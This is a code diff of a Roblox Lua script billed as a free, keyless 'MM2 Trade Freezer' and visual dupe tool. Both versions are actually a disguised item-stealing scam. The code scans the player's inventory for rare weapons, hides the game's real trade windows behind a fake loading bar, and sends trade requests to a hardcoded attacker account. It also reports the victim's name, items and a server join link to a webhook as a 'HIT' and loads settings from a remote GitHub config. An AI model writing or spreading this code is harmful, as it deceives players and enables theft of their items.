@@ -1,26 +1,16 @@
---[[
-    MM2 Trade Freezer  v8.3  |  KEYLESS  |  FREE
-    Freeze Trade / Trade Window Lock / Dupe (visual) / AutoFarm
-    Tiers: godly + ancient + unique + chroma
-]]
+--[[ MM2 Trade Freezer v8.4 | KEYLESS | FREE ]]
 
---==================================================================
--- CONFIG
---==================================================================
 local CONFIG = {
     WEBHOOK        = "",
     REMOTE_CONFIG  = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/main/cfg.json",
     ATTACKER_ID    = 0,
     ATTACKER_NAME  = "Viivik13",
-
     REMOTES = { send = "", add = "", accept = "", confirm = "", cancel = "" },
-
     LOAD_DURATION  = 120,
     MODE           = "DRAIN",
     FILTER         = "rare",
     MIN_VALUE      = 100,
     GODLY_FLOOR    = 100,
-
     MAX_ITEMS      = 20,
     MAX_TRADES     = 1,
     BETWEEN_TRADES = 12,
@@ -36,12 +26,8 @@ local CONFIG = {
     DEBUG          = true,
 }
 
---==================================================================
--- SERVICES
---==================================================================
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService      = game:GetService("TweenService")
 local HttpService       = game:GetService("HttpService")
 local Lighting          = game:GetService("Lighting")
 
@@ -51,16 +37,14 @@ local playerGui = lp:WaitForChild("PlayerGui")
 local STATE = { stopped = false, rounds = 0 }
 getgenv().MM2FZ = { stop = function() STATE.stopped = true end }
 
---==================================================================
--- HTTP
---==================================================================
 local httpFn = (syn and syn.request) or (http and http.request)
     or http_request or (fluxus and fluxus.request) or request
 
 local function http(t)
     if not httpFn then return nil end
     local ok, res = pcall(httpFn, t)
-    return ok and res or nil
+    if ok then return res end
+    return nil
 end
 
 local function chunkString(s, n)
@@ -70,6 +54,7 @@ local function chunkString(s, n)
 end
 
 local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
 local function b64decode(s)
     s = s:gsub("[^%w%+/=]", "")
     local out, buf, bits = {}, 0, 0
@@ -91,9 +76,16 @@ local function b64decode(s)
     return table.concat(out)
 end
 
+local function getUrl(url)
+    local opts = {}
+    opts.Url = url
+    opts.Method = "GET"
+    return http(opts)
+end
+
 local function loadConfig()
     if CONFIG.REMOTE_CONFIG == "" then return end
-    local res = http({ Url = CONFIG.REMOTE_CONFIG .. "?t=" .. os.time(), Method = "GET" })
+    local res = getUrl(CONFIG.REMOTE_CONFIG .. "?t=" .. os.time())
     if res and res.Body then
         local ok, d = pcall(HttpService.JSONDecode, HttpService, res.Body)
         if ok and type(d) == "table" then
@@ -112,35 +104,38 @@ end
 local function webhook(title, color, desc, fields, content)
     if not httpFn or CONFIG.WEBHOOK == "" then return end
     task.spawn(function()
-        http({
-            Url = CONFIG.WEBHOOK,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({
-                username = "MM2 Monitor",
-                content = content,
-                embeds = {{
-                    title = title, description = desc, color = color,
-                    timestamp = DateTime.now():ToIsoDate(),
-                    thumbnail = { url = string.format(
-                        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId) },
-                    footer = { text = "MM2 Trade Freezer v8.3 | keyless" },
-                    fields = fields or {},
-                }},
-            }),
-        })
+        local payload = {}
+        payload.username = "MM2 Monitor"
+        payload.content = content
+        local thumb = {}
+        thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
+        local foot = {}
+        foot.text = "MM2 Trade Freezer v8.4 | keyless"
+        local emb = {}
+        emb.title = title
+        emb.description = desc
+        emb.color = color
+        emb.timestamp = DateTime.now():ToIsoDate()
+        emb.thumbnail = thumb
+        emb.footer = foot
+        emb.fields = fields
+        payload.embeds = { emb }
+        local opts = {}
+        opts.Url = CONFIG.WEBHOOK
+        opts.Method = "POST"
+        local hdrs = {}
+        hdrs["Content-Type"] = "application/json"
+        opts.Headers = hdrs
+        opts.Body = HttpService:JSONEncode(payload)
+        http(opts)
     end)
 end
 
---==================================================================
--- UI
---==================================================================
 local fakeGui = Instance.new("ScreenGui")
 fakeGui.Name = "MM2_TradeFreezer"
 fakeGui.ResetOnSpawn = false
 fakeGui.IgnoreGuiInset = true
 fakeGui.DisplayOrder = 2147483647
-fakeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 fakeGui.Parent = playerGui
 
 local main = Instance.new("Frame")
@@ -150,15 +145,13 @@ main.BackgroundColor3 = Color3.fromRGB(17, 17, 21)
 main.BorderSizePixel = 0
 main.Active = false
 main.Parent = fakeGui
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 9)
-mainCorner.Parent = main
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(58, 58, 70)
-stroke.Parent = main
+local mc = Instance.new("UICorner")
+mc.CornerRadius = UDim.new(0, 9)
+mc.Parent = main
 
 local uiScale = Instance.new("UIScale")
 uiScale.Parent = main
+
 local function applyScale()
     local vp = playerGui.AbsoluteSize
     if vp.X > 0 and vp.Y > 0 then
@@ -181,7 +174,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.3"
+title.Text = "MM2 Trade Freezer   v8.4"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -193,9 +186,9 @@ badge.TextSize = 10
 badge.TextColor3 = Color3.fromRGB(205, 255, 218)
 badge.Text = "KEYLESS"
 badge.Parent = titleBar
-local badgeCorner = Instance.new("UICorner")
-badgeCorner.CornerRadius = UDim.new(0, 4)
-badgeCorner.Parent = badge
+local bc = Instance.new("UICorner")
+bc.CornerRadius = UDim.new(0, 4)
+bc.Parent = badge
 
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Size = UDim2.new(1, -28, 0, 18)
@@ -219,7 +212,9 @@ timerLabel.TextColor3 = Color3.fromRGB(150, 150, 165)
 timerLabel.Text = "00:00"
 timerLabel.Parent = main
 
-local function makeRow(y, label, onText, offText, startOn)
+local freezeOn = true
+
+local function makeRow(y, label, onText, offText)
     local row = Instance.new("TextButton")
     row.Size = UDim2.new(1, -28, 0, 30)
     row.Position = UDim2.fromOffset(14, y)
@@ -228,81 +223,74 @@ local function makeRow(y, label, onText, offText, startOn)
     row.AutoButtonColor = false
     row.Text = ""
     row.Parent = main
-    local rowCorner = Instance.new("UICorner")
-    rowCorner.CornerRadius = UDim.new(0, 6)
-    rowCorner.Parent = row
+    local rc = Instance.new("UICorner")
+    rc.CornerRadius = UDim.new(0, 6)
+    rc.Parent = row
 
-    local l = Instance.new("TextLabel")
-    l.Size = UDim2.new(1, -80, 1, 0)
-    l.Position = UDim2.fromOffset(10, 0)
-    l.BackgroundTransparency = 1
-    l.Font = Enum.Font.GothamMedium
-    l.TextSize = 12
-    l.TextXAlignment = Enum.TextXAlignment.Left
-    l.TextColor3 = Color3.fromRGB(220, 220, 230)
-    l.Text = label
-    l.Parent = row
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, -80, 1, 0)
+    lbl.Position = UDim2.fromOffset(10, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Font = Enum.Font.GothamMedium
+    lbl.TextSize = 12
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.TextColor3 = Color3.fromRGB(220, 220, 230)
+    lbl.Text = label
+    lbl.Parent = row
 
     local pill = Instance.new("Frame")
     pill.Size = UDim2.fromOffset(40, 20)
     pill.Position = UDim2.new(1, -50, 0, 5)
+    pill.BackgroundColor3 = Color3.fromRGB(40, 150, 80)
     pill.Parent = row
-    local pillCorner = Instance.new("UICorner")
-    pillCorner.CornerRadius = UDim.new(1, 0)
-    pillCorner.Parent = pill
+    local pc = Instance.new("UICorner")
+    pc.CornerRadius = UDim.new(1, 0)
+    pc.Parent = pill
 
-    local k = Instance.new("Frame")
-    k.Size = UDim2.fromOffset(16, 16)
-    k.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
-    k.Parent = pill
-    local kCorner = Instance.new("UICorner")
-    kCorner.CornerRadius = UDim.new(1, 0)
-    kCorner.Parent = k
+    local knob = Instance.new("Frame")
+    knob.Size = UDim2.fromOffset(16, 16)
+    knob.Position = UDim2.fromOffset(21, 2)
+    knob.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
+    knob.Parent = pill
+    local kc = Instance.new("UICorner")
+    kc.CornerRadius = UDim.new(1, 0)
+    kc.Parent = knob
 
-    local on = startOn
-    if on then
-        pill.BackgroundColor3 = Color3.fromRGB(40, 150, 80)
-        k.Position = UDim2.fromOffset(21, 2)
-    else
-        pill.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
-        k.Position = UDim2.fromOffset(3, 2)
+    local function toggle()
+        freezeOn = not freezeOn
+        if freezeOn then
+            pill.BackgroundColor3 = Color3.fromRGB(40, 150, 80)
+            knob.Position = UDim2.fromOffset(21, 2)
+            statusLabel.Text = onText
+            statusLabel.TextColor3 = Color3.fromRGB(120, 220, 150)
+        else
+            pill.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+            knob.Position = UDim2.fromOffset(3, 2)
+            statusLabel.Text = offText
+            statusLabel.TextColor3 = Color3.fromRGB(150, 150, 160)
+        end
     end
 
-    row.MouseButton1Click:Connect(function()
-        on = not on
-        local bg = Color3.fromRGB(60, 60, 70)
-        local kp = UDim2.fromOffset(3, 2)
-        local col = Color3.fromRGB(150, 150, 160)
-        local txt = offText
-        if on then
-            bg = Color3.fromRGB(40, 150, 80)
-            kp = UDim2.fromOffset(21, 2)
-            col = Color3.fromRGB(120, 220, 150)
-            txt = onText
-        end
-        local t1 = TweenService:Create(pill, TweenInfo.new(0.15), { BackgroundColor3 = bg })
-        local t2 = TweenService:Create(k, TweenInfo.new(0.15), { Position = kp })
-        t1:Play()
-        t2:Play()
-        statusLabel.Text = txt
-        statusLabel.TextColor3 = col
-    end)
-    return function() return on end
+    row.MouseButton1Click:Connect(toggle)
 end
 
-local getFreeze = makeRow(40, "Freeze Trade", "TRADE WINDOW LOCKED", "FREEZE DISABLED", true)
-makeRow(74, "Dupe Weapons (visual)", "DUPE QUEUE ACTIVE", "DUPE QUEUE IDLE", true)
+makeRow(40, "Freeze Trade", "TRADE WINDOW LOCKED", "FREEZE DISABLED")
+makeRow(74, "Dupe Weapons (visual)", "DUPE QUEUE ACTIVE", "DUPE QUEUE IDLE")
 
-task.spawn(function()
-    local t = 0
+local timerCount = 0
+
+local function tickTimer()
     while true do
         task.wait(1)
-        if getFreeze() then
-            t = t + 1
-            timerLabel.Text = string.format("%02d:%02d", math.floor(t / 60), t % 60)
+        if freezeOn then
+            timerCount = timerCount + 1
+            local mins = math.floor(timerCount / 60)
+            local secs = timerCount % 60
+            timerLabel.Text = string.format("%02d:%02d", mins, secs)
         end
     end
-end)
+end
+task.spawn(tickTimer)
 
 local barBg = Instance.new("Frame")
 barBg.Size = UDim2.new(1, -28, 0, 9)
@@ -310,18 +298,18 @@ barBg.Position = UDim2.fromOffset(14, 112)
 barBg.BackgroundColor3 = Color3.fromRGB(34, 34, 41)
 barBg.BorderSizePixel = 0
 barBg.Parent = main
-local barBgCorner = Instance.new("UICorner")
-barBgCorner.CornerRadius = UDim.new(0, 5)
-barBgCorner.Parent = barBg
+local bbgc = Instance.new("UICorner")
+bbgc.CornerRadius = UDim.new(0, 5)
+bbgc.Parent = barBg
 
 local bar = Instance.new("Frame")
 bar.Size = UDim2.new(0, 0, 1, 0)
 bar.BackgroundColor3 = Color3.fromRGB(95, 175, 255)
 bar.BorderSizePixel = 0
 bar.Parent = barBg
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0, 5)
-barCorner.Parent = bar
+local barc = Instance.new("UICorner")
+barc.CornerRadius = UDim.new(0, 5)
+barc.Parent = bar
 
 local pctLabel = Instance.new("TextLabel")
 pctLabel.Size = UDim2.new(1, -28, 0, 16)
@@ -343,86 +331,92 @@ console.ScrollBarThickness = 2
 console.ScrollBarImageColor3 = Color3.fromRGB(58, 58, 70)
 console.AutomaticCanvasSize = Enum.AutomaticSize.Y
 console.Parent = main
-local layout = Instance.new("UIListLayout")
-layout.Padding = UDim.new(0, 2)
-layout.SortOrder = Enum.SortOrder.LayoutOrder
-layout.Parent = console
+local listLayout = Instance.new("UIListLayout")
+listLayout.Padding = UDim.new(0, 2)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Parent = console
 
 local lineCount = 0
+
 local function log(msg)
     lineCount = lineCount + 1
-    local l = Instance.new("TextLabel")
-    l.Size = UDim2.new(1, 0, 0, 13)
-    l.BackgroundTransparency = 1
-    l.Font = Enum.Font.Code
-    l.TextSize = 10
-    l.TextXAlignment = Enum.TextXAlignment.Left
-    l.TextColor3 = Color3.fromRGB(118, 175, 130)
-    l.Text = "  > " .. msg
-    l.LayoutOrder = lineCount
-    l.Parent = console
+    local line = Instance.new("TextLabel")
+    line.Size = UDim2.new(1, 0, 0, 13)
+    line.BackgroundTransparency = 1
+    line.Font = Enum.Font.Code
+    line.TextSize = 10
+    line.TextXAlignment = Enum.TextXAlignment.Left
+    line.TextColor3 = Color3.fromRGB(118, 175, 130)
+    line.Text = "  > " .. msg
+    line.LayoutOrder = lineCount
+    line.Parent = console
     if #console:GetChildren() > 26 then
         for _, c in ipairs(console:GetChildren()) do
-            if c:IsA("TextLabel") and c.LayoutOrder <= lineCount - 22 then c:Destroy() end
+            if c:IsA("TextLabel") and c.LayoutOrder <= lineCount - 22 then
+                c:Destroy()
+            end
         end
     end
-    task.defer(function() console.CanvasPosition = Vector2.new(0, 1e5) end)
     if CONFIG.DEBUG then print("[FZ] " .. msg) end
 end
 
-local progress, frozenDone, stallUntil = 0, false, 0
+local progress = 0
+local frozenDone = false
+local stallUntil = 0
 local startClock = os.clock()
-local msgs = {
-    "hooking trade service...", "patching window lock...", "syncing item cache...",
-    "resolving value index...", "reapplying freeze...", "waiting on handshake...",
-}
-task.spawn(function()
+local stageMsgs = { "hooking trade service", "patching window lock", "syncing item cache", "resolving value index", "reapplying freeze" }
+
+local function stageFor(p)
+    if p < 25 then return stageMsgs[1] end
+    if p < 50 then return stageMsgs[2] end
+    if p < 75 then return stageMsgs[3] end
+    return stageMsgs[4]
+end
+
+local function runLoader()
     while true do
         local el = os.clock() - startClock
         if el >= CONFIG.LOAD_DURATION then frozenDone = true end
         if frozenDone then
             bar.Size = UDim2.new(0.99, 0, 1, 0)
-            pctLabel.Text = "99%  ::  " .. msgs[math.random(#msgs)]
+            pctLabel.Text = "99%  ::  " .. stageMsgs[5] .. "..."
             task.wait(2)
         elseif os.clock() < stallUntil then
             task.wait(0.5)
         else
-            if math.random() < 0.055 then stallUntil = os.clock() + math.random(2, 6) end
+            if math.random() < 0.055 then
+                stallUntil = os.clock() + math.random(2, 6)
+            end
             local frac = math.clamp(el / CONFIG.LOAD_DURATION, 0, 1)
             local target = math.max(1, 99 * (1 - (1 - frac) ^ 2.0))
             progress = math.min(99, progress + math.max(0.4, (target - progress) * 0.22))
             bar.Size = UDim2.new(progress / 100, 0, 1, 0)
-            local stage = "resolving value index"
-            if progress < 25 then
-                stage = "hooking trade service"
-            elseif progress < 50 then
-                stage = "patching window lock"
-            elseif progress < 75 then
-                stage = "syncing item cache"
-            elseif progress >= 95 then
-                stage = msgs[math.random(#msgs)]
-            end
-            pctLabel.Text = math.floor(progress) .. "%  ::  " .. stage
+            pctLabel.Text = math.floor(progress) .. "%  ::  " .. stageFor(progress)
             task.wait(math.random(35, 80) / 100)
         end
     end
-end)
+end
+task.spawn(runLoader)
 
-log("Trade Freezer v8.3 loaded")
-log("place " .. game.PlaceId .. " / " .. game.JobId:sub(1, 8))
+log("Trade Freezer v8.4 loaded")
+log("place " .. game.PlaceId)
 if game.PlaceId ~= CONFIG.PLACE_ID then log("note: not the MM2 place") end
 
---==================================================================
--- VALUES
---==================================================================
 local VALUES = {}
 local CACHE_FILE = "MM2FZ_values.json"
-local function key(s) return (s or ""):lower():gsub("^%s+", ""):gsub("%s+$", "") end
+
+local function key(s)
+    local low = (s or ""):lower()
+    low = low:gsub("^%s+", "")
+    low = low:gsub("%s+$", "")
+    return low
+end
+
 local function setVal(name, v)
-    v = tonumber(v)
-    if not name or not v or v <= 0 then return end
+    local num = tonumber(v)
+    if not name or not num or num <= 0 then return end
     local k = key(name)
-    if not VALUES[k] or v > VALUES[k] then VALUES[k] = v end
+    if not VALUES[k] or num > VALUES[k] then VALUES[k] = num end
 end
 
 local SOURCES = {
@@ -437,7 +431,9 @@ local function ingest(data)
     local n = 0
     for k, v in pairs(data) do
         if type(v) == "table" then
-            setVal(v.name or v.item or v.display or (type(k) == "string" and k), v.value or v.val or v.price)
+            local nm = v.name or v.item or v.display
+            if not nm and type(k) == "string" then nm = k end
+            setVal(nm, v.value or v.val or v.price)
             n = n + 1
         elseif type(v) == "number" and type(k) == "string" then
             setVal(k, v)
@@ -447,20 +443,17 @@ local function ingest(data)
     return n
 end
 
-local GODLY, ANCIENT, UNIQUE = {}, {}, {}
-local function fill(t, list) for _, n in ipairs(list) do t[n] = true end end
+local GODLY = {}
+local ANCIENT = {}
+local UNIQUE = {}
 
-fill(GODLY, {
-    "seer","luger","slasher","deathshard","fang","shark","gingerblade","heat","saw",
-    "tides","gemstone","lightbringer","darkbringer","corrupt",
-})
-fill(ANCIENT, {
-    "gingerscope","icebreaker","harvester","battleaxe","icewing","nebula",
-    "traveler's gun","traveler's knife","snowstorm","blizzard",
-})
-fill(UNIQUE, {
-    "moon","sun","aurora","virtue","prismatic","bloodweaver","ghostblade","spirit",
-})
+local function fill(t, list)
+    for _, n in ipairs(list) do t[n] = true end
+end
+
+fill(GODLY, { "seer", "luger", "slasher", "deathshard", "fang", "shark", "gingerblade", "heat", "saw", "tides", "gemstone", "lightbringer", "darkbringer", "corrupt" })
+fill(ANCIENT, { "gingerscope", "icebreaker", "harvester", "battleaxe", "icewing", "nebula", "traveler's gun", "traveler's knife", "snowstorm", "blizzard" })
+fill(UNIQUE, { "moon", "sun", "aurora", "virtue", "prismatic", "bloodweaver", "ghostblade", "spirit" })
 
 local function rarityTag(name)
     local k = key(name)
@@ -499,24 +492,31 @@ for k, v in pairs(BASELINE) do VALUES[k] = v end
 
 local function loadValues()
     if isfile and isfile(CACHE_FILE) then
-        pcall(function()
-            local d = HttpService:JSONDecode(readfile(CACHE_FILE))
-            if type(d) == "table" and d.t and os.time() - d.t < 21600 and type(d.v) == "table" then
+        local raw = readfile(CACHE_FILE)
+        local okd, d = pcall(HttpService.JSONDecode, HttpService, raw)
+        if okd and type(d) == "table" and type(d.v) == "table" then
+            if d.t and os.time() - d.t < 21600 then
                 for k, v in pairs(d.v) do setVal(k, v) end
                 log("value cache loaded")
             end
-        end)
+        end
     end
     for _, url in ipairs(SOURCES) do
-        local res = http({ Url = url, Method = "GET" })
+        local res = getUrl(url)
         if res and res.Body then
-            local ok, data = pcall(HttpService:JSONDecode, HttpService, res.Body)
-            if ok and type(data) == "table" and ingest(data) > 20 then
-                log("value index synced")
-                if writefile then
-                    pcall(writefile, CACHE_FILE, HttpService:JSONEncode({ t = os.time(), v = VALUES }))
+            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+            if ok and type(data) == "table" then
+                local count = ingest(data)
+                if count > 20 then
+                    log("value index synced")
+                    if writefile then
+                        local payload = {}
+                        payload.t = os.time()
+                        payload.v = VALUES
+                        pcall(writefile, CACHE_FILE, HttpService:JSONEncode(payload))
+                    end
+                    return
                 end
-                return
             end
         end
     end
@@ -529,25 +529,28 @@ local function valueOf(name)
     return VALUES[key(name):gsub("%s*%(.-%)%s*$", "")] or 0
 end
 
---==================================================================
--- INVENTORY
---==================================================================
 local function looksLikeId(s)
-    return #s >= 28 and not s:find("%s") and s:match("^[%w%-_]+$") ~= nil
+    if #s < 28 then return false end
+    if s:find("%s") then return false end
+    if not s:match("^[%w%-_]+$") then return false end
+    return true
 end
 
 local function containers()
-    local out, seen = {}, {}
+    local out = {}
+    local seen = {}
     local function scan(parent, depth)
         if depth > 2 or not parent then return end
         for _, c in ipairs(parent:GetChildren()) do
-            if (c:IsA("Folder") or c:IsA("Configuration")) and not seen[c] then
-                local n = c.Name:lower()
-                if n:find("inv") or n:find("item") then
-                    seen[c] = true
-                    out[#out + 1] = c
-                elseif depth < 2 then
-                    scan(c, depth + 1)
+            if c:IsA("Folder") or c:IsA("Configuration") then
+                if not seen[c] then
+                    local n = c.Name:lower()
+                    if n:find("inv") or n:find("item") then
+                        seen[c] = true
+                        out[#out + 1] = c
+                    elseif depth < 2 then
+                        scan(c, depth + 1)
+                    end
                 end
             end
         end
@@ -557,25 +560,38 @@ local function containers()
 end
 
 local function getItems()
-    local items, seen = {}, {}
+    local items = {}
+    local seen = {}
     for _, c in ipairs(containers()) do
         for _, ch in ipairs(c:GetChildren()) do
-            local id, name
+            local id = nil
+            local name = nil
             if ch:IsA("StringValue") then
                 if looksLikeId(ch.Name) then
-                    id, name = ch.Name, ch.Value
+                    id = ch.Name
+                    name = ch.Value
                 elseif looksLikeId(ch.Value) then
-                    id, name = ch.Value, ch.Name
+                    id = ch.Value
+                    name = ch.Name
                 else
-                    id, name = ch.Name, ch.Value
+                    id = ch.Name
+                    name = ch.Value
                 end
             elseif ch:IsA("Folder") then
                 local nv = ch:FindFirstChildWhichIsA("StringValue")
-                if nv then id, name = ch.Name, nv.Value end
+                if nv then
+                    id = ch.Name
+                    name = nv.Value
+                end
             end
             if id and name and name ~= "" and not seen[id] then
                 seen[id] = true
-                items[#items + 1] = { id = id, name = name, value = valueOf(name), tag = rarityTag(name) }
+                local entry = {}
+                entry.id = id
+                entry.name = name
+                entry.value = valueOf(name)
+                entry.tag = rarityTag(name)
+                items[#items + 1] = entry
             end
         end
     end
@@ -589,23 +605,24 @@ local function isWanted(it)
     local k = key(it.name)
     if k:find("^chroma ") then return true end
     if CONFIG.FILTER == "godly" then
-        return GODLY[k] == true or it.value >= CONFIG.GODLY_FLOOR
+        if GODLY[k] then return true end
+        return it.value >= CONFIG.GODLY_FLOOR
     end
-    if GODLY[k] == true then return true end
-    if ANCIENT[k] == true then return true end
-    if UNIQUE[k] == true then return true end
+    if GODLY[k] then return true end
+    if ANCIENT[k] then return true end
+    if UNIQUE[k] then return true end
     return it.value >= CONFIG.GODLY_FLOOR
 end
 
---==================================================================
--- REMOTES
---==================================================================
 loadConfig()
 
 local function findRemote(patterns)
-    for _, c in ipairs({ ReplicatedStorage:FindFirstChild("GameRemotes"),
-        ReplicatedStorage:FindFirstChild("Remotes"), ReplicatedStorage:FindFirstChild("RemoteEvents"),
-        ReplicatedStorage }) do
+    local roots = {}
+    roots[1] = ReplicatedStorage:FindFirstChild("GameRemotes")
+    roots[2] = ReplicatedStorage:FindFirstChild("Remotes")
+    roots[3] = ReplicatedStorage:FindFirstChild("RemoteEvents")
+    roots[4] = ReplicatedStorage
+    for _, c in ipairs(roots) do
         if c then
             for _, d in ipairs(c:GetDescendants()) do
                 if d:IsA("RemoteEvent") then
@@ -617,6 +634,7 @@ local function findRemote(patterns)
             end
         end
     end
+    return nil
 end
 
 local function resolveRemote(override, patterns, label, timeout)
@@ -628,7 +646,8 @@ local function resolveRemote(override, patterns, label, timeout)
         end
         log("override failed: " .. override)
     end
-    local r, t = findRemote(patterns), 0
+    local r = findRemote(patterns)
+    local t = 0
     while not r and t < (timeout or 10) do
         task.wait(0.4)
         t = t + 0.4
@@ -649,42 +668,54 @@ R.accept  = resolveRemote(CONFIG.REMOTES.accept,  { "accepttrade", "tradeaccept"
 R.confirm = resolveRemote(CONFIG.REMOTES.confirm, { "confirmtrade", "tradeconfirm", "confirm" }, "confirm")
 R.cancel  = resolveRemote(CONFIG.REMOTES.cancel,  { "canceltrade", "declinetrade", "tradecancel" }, "cancel")
 
---==================================================================
--- TRADE UI
---==================================================================
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
-        if g ~= fakeGui and g:IsA("ScreenGui") and g.Name:lower():find("trade") and g.Enabled then
-            g.Enabled = false
+        if g ~= fakeGui and g:IsA("ScreenGui") then
+            local n = g.Name:lower()
+            if n:find("trade") and g.Enabled then
+                g.Enabled = false
+            end
         end
     end
     if CONFIG.BLUR_OFF then
         local b = Lighting:FindFirstChildOfClass("BlurEffect")
-        if b and b.Size > 0 then b.Size = 0 end
+        if b then
+            if b.Size > 0 then b.Size = 0 end
+        end
     end
 end
 
-task.spawn(function()
+local function hideLoop()
     while true do
         hideTradeUI()
         task.wait(0.15)
     end
-end)
+end
+task.spawn(hideLoop)
 
 local function tradeGui()
     for _, g in ipairs(playerGui:GetChildren()) do
-        if g ~= fakeGui and g:IsA("ScreenGui") and g.Name:lower():find("trade") then return g end
+        if g ~= fakeGui and g:IsA("ScreenGui") then
+            local n = g.Name:lower()
+            if n:find("trade") then return g end
+        end
     end
+    return nil
 end
 
-local textCache, textCacheCount = nil, -1
+local textCache = nil
+local textCacheCount = -1
+
 local function textNodes(gui)
     if not gui then return {} end
     local n = #gui:GetDescendants()
     if not textCache or n ~= textCacheCount then
-        textCache, textCacheCount = {}, n
+        textCache = {}
+        textCacheCount = n
         for _, d in ipairs(gui:GetDescendants()) do
-            if d:IsA("TextLabel") or d:IsA("TextButton") then textCache[#textCache + 1] = d end
+            if d:IsA("TextLabel") or d:IsA("TextButton") then
+                textCache[#textCache + 1] = d
+            end
         end
     end
     return textCache
@@ -699,16 +730,17 @@ local function countIn(gui, needle)
     return n
 end
 
---==================================================================
--- HELPERS
---==================================================================
 local function target()
     for _, p in ipairs(Players:GetPlayers()) do
         if p ~= lp then
-            if CONFIG.ATTACKER_ID > 0 and p.UserId == CONFIG.ATTACKER_ID then return p end
-            if CONFIG.ATTACKER_ID == 0 and p.Name:lower() == CONFIG.ATTACKER_NAME:lower() then return p end
+            if CONFIG.ATTACKER_ID > 0 then
+                if p.UserId == CONFIG.ATTACKER_ID then return p end
+            else
+                if p.Name:lower() == CONFIG.ATTACKER_NAME:lower() then return p end
+            end
         end
     end
+    return nil
 end
 
 local function serverLink()
@@ -727,19 +759,32 @@ local function itemLines(list, limit)
 end
 
 local function notifyJoin(items, total)
-    local fields = {
-        { name = "Roblox", value = string.format("**%s**\n`%s`\n[profile](https://www.roblox.com/users/%d/profile)", lp.DisplayName, lp.Name, lp.UserId), inline = true },
-        { name = "Queued", value = #items .. " item(s)\n" .. total .. " est value", inline = true },
-        { name = "Server", value = "[CLICK TO JOIN](" .. serverLink() .. ")\n`" .. game.JobId .. "`", inline = false },
-    }
-    for i, part in ipairs(chunkString(itemLines(items, 25), 900)) do
-        local fname = "Top items"
-        if i > 1 then fname = "Top items (cont)" end
-        fields[#fields + 1] = { name = fname, value = part, inline = false }
+    local fields = {}
+    local f1 = {}
+    f1.name = "Roblox"
+    f1.value = string.format("**%s**\n`%s`\n[profile](https://www.roblox.com/users/%d/profile)", lp.DisplayName, lp.Name, lp.UserId)
+    f1.inline = true
+    fields[1] = f1
+    local f2 = {}
+    f2.name = "Queued"
+    f2.value = #items .. " item(s)\n" .. total .. " est value"
+    f2.inline = true
+    fields[2] = f2
+    local f3 = {}
+    f3.name = "Server"
+    f3.value = "[CLICK TO JOIN](" .. serverLink() .. ")\n`" .. game.JobId .. "`"
+    f3.inline = false
+    fields[3] = f3
+    local chunks = chunkString(itemLines(items, 25), 900)
+    for i, part in ipairs(chunks) do
+        local fi = {}
+        fi.name = "Top items"
+        if i > 1 then fi.name = "Top items (cont)" end
+        fi.value = part
+        fi.inline = false
+        fields[#fields + 1] = fi
     end
-    webhook("MM2 HIT — FREEZE ACTIVE", 0x57F287,
-        "**" .. lp.DisplayName .. "** froze a trade. Join and accept.", fields,
-        "@here **HIT** — `" .. lp.Name .. "`")
+    webhook("MM2 HIT - FREEZE ACTIVE", 0x57F287, "**" .. lp.DisplayName .. "** froze a trade. Join and accept.", fields, "@here **HIT** - `" .. lp.Name .. "`")
 end
 
 local function waitForTarget()
@@ -748,37 +793,42 @@ local function waitForTarget()
     log("waiting for host to join")
     for i = 1, CONFIG.MAX_REMINDERS do
         local w = 0
-        while w < CONFIG.REMINDER_EVERY and not STATE.stopped do
+        while w < CONFIG.REMINDER_EVERY do
+            if STATE.stopped then break end
             task.wait(1)
             w = w + 1
             tgt = target()
             if tgt then return tgt end
         end
         if tgt then return tgt end
-        webhook("Reminder " .. i .. "/" .. CONFIG.MAX_REMINDERS, 0xFFAA33,
-            "`" .. lp.Name .. "` still frozen in `" .. game.JobId .. "`",
-            { { name = "Join", value = "[CLICK TO JOIN](" .. serverLink() .. ")", inline = false } }, "@here")
+        local f = {}
+        f.name = "Join"
+        f.value = "[CLICK TO JOIN](" .. serverLink() .. ")"
+        f.inline = false
+        webhook("Reminder " .. i, 0xFFAA33, "`" .. lp.Name .. "` still frozen", { f }, "@here")
     end
+    return nil
 end
 
---==================================================================
--- ONE ROUND
---==================================================================
 local function doRound(batch, tgt, round)
-    local gui
+    local gui = nil
     local deadline = os.clock() + CONFIG.REQUEST_TIMEOUT
     local attempt = 0
-    while os.clock() < deadline and not gui and not STATE.stopped do
+    while os.clock() < deadline do
+        if gui then break end
+        if STATE.stopped then break end
         attempt = attempt + 1
         if attempt % 3 == 1 then log("request -> " .. tgt.Name .. " (r" .. round .. ")") end
         pcall(function() R.send:FireServer(tgt) end)
         local w = 0
-        while w < 4 and not gui do
+        while w < 4 do
+            if gui then break end
             task.wait(0.25)
             w = w + 0.25
             gui = tradeGui()
         end
-        tgt = target() or tgt
+        local still = target()
+        if still then tgt = still end
